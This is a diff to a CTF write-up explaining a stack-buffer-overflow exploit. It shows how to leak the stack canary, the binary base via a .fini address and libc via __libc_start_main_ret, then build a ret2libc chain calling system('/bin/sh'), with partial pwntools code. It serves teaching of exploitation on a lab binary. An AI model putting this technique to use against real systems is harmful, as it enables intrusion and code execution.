@@ -20,15 +20,16 @@ we could write like so
 
 41 41 41 41 41 41 41 41 0a \<canary>
 
-now, when it prints, it'll keep printing, leaking the canary and saved RBP. 
+now, when it prints, it'll keep printing, leaking the canary and ~~saved RBP~~ .fini address. 
 
 NOTE: Canaries start with null bytes! We will have to overflow one byte of the canary so that we can read the rest. It doesn't matter that we overflow the canary until we make the program ret, but by then we will know what the full canary is and be able to replace it.
 
-We can use this again to leak the saved ret address, which will be __libc_start_main_ret. 
+We can use this again to leak the saved ret address, which will be `__libc_start_main_ret.`
+
 Once all these values are leaked, we send the finished exploit. notflag{a_cloud_is_just_someone_elses_computer}\n\x00 + padding + canary + more padding + poprdi + /bin/sh address + retgadget + systemaddress
 
-NOTE: For some reason, the saved RBP value is a binary address. We don't strictly *need* the binary base here since libc will have rop gadgets, but it makes our lives a bit easier to get the saved RBP and then offset.
-```python
+NOTE: We can leak the binary base through the .fini address. We don't strictly *need* it here, as libc has ROP gadgets, but it's useful.
+```
 from pwn import *
 mode = sys.argv[1]
 NUM_TO_CANARY = 0x90 - 0x8
@@ -62,8 +63,8 @@ leak = getoutput(b"A" * (NUM_TO_CANARY))
 canary = u64(b'\x00' + leak[:7])
 log.info(f"Canary: {hex(canary)}")
 pause()
-rbp = u64(leak[7:] + b'\x00\x00')
-e.address = rbp - 0xb70
+fini = u64(leak[7:] + b'\x00\x00')
+e.address = fini - 0xb70
 log.info(f"Binary base: {hex(e.address)}")
 #Leak libc base by leaking the libc start main ret
 leak2 = getoutput(b"A" * (NUM_TO_RET-1))
